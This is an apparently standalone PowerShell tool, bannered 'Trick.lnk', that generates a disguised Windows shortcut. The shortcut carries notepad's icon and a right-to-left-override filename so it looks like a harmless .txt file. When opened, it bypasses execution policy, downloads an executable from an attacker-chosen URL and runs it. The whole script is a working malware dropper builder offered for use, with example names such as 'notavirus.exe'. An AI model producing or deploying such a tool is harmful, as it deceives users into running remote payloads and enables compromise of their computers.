[Reflection.Assembly]::LoadWithPartialName("System.Web")
[System.Console]::Clear();
Write-Host "████████╗██████╗ ██╗ ██████╗██╗  ██╗██╗   ██╗██╗     ███╗   ██╗██╗  ██╗" -ForegroundColor BLUE
Write-Host "╚══██╔══╝██╔══██╗██║██╔════╝██║ ██╔╝╚██╗ ██╔╝██║     ████╗  ██║██║ ██╔╝" -ForegroundColor BLUE
Write-Host "   ██║   ██████╔╝██║██║     █████╔╝  ╚████╔╝ ██║     ██╔██╗ ██║█████╔╝ " -ForegroundColor BLUE
Write-Host "   ██║   ██╔══██╗██║██║     ██╔═██╗   ╚██╔╝  ██║     ██║╚██╗██║██╔═██╗ " -ForegroundColor BLUE
Write-Host "   ██║   ██║  ██║██║╚██████╗██║  ██╗   ██║██╗███████╗██║ ╚████║██║  ██╗" -ForegroundColor BLUE
Write-Host "   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝" -ForegroundColor BLUE
Write-Host "Creates a hidden unicode .lnk file that webdownloads and execute a file.`r`n" -ForegroundColor BLUE

$String = Read-Host -Prompt 'Input the .lnk filename. (ex.: ReadMe)'
$Bytes = [system.text.encoding]::unicode.GetBytes("$String")
Foreach ($B in $Bytes){
if ($b -eq 0){Continue;}
    $Section ="%u00"+ $B.tostring("x")
    $Sections += $Section
}
Write-Host "The output file will be named"$env:USERPROFILE"\Desktop\"$String".txt`r`n" -ForegroundColor RED 
 
$theurl = Read-Host -Prompt 'Input the complete url of the exe to webDL. (ex. http://illmob.org/test.exe)'
Write-Host "The exe will be downloaded from"$theurl"`r`n" -ForegroundColor RED

$thename = Read-Host -Prompt 'Input filename to save as. (ex.: notavirus.exe)'
Write-Host "The exe will be saved as "$thename"`r`n" -ForegroundColor RED

$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut($env:USERPROFILE + "\Desktop\FakeText.lnk")
$ShortCut.Arguments = " -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('$theurl','$thename');./$thename;"
$ShortCut.TargetPath = "powershell"
$ShortCut.IconLocation = "C:\Windows\System32\notepad.exe, 0";
$ShortCut.Description = "Type: Text Document";
$ShortCut.Save()

$unicode = $Sections + "%u002e%u202e%u0074%u0078%u0074%u002e%u006c%u006e%u006b"
$unescape = [web.httputility]::urldecode($unicode)
ren ($env:USERPROFILE + "\Desktop\FakeText.lnk") ($env:USERPROFILE + "\Desktop\" + $unescape)

Write-Host $env:USERPROFILE"\Desktop\"$String".txt created." -ForegroundColor MAGENTA
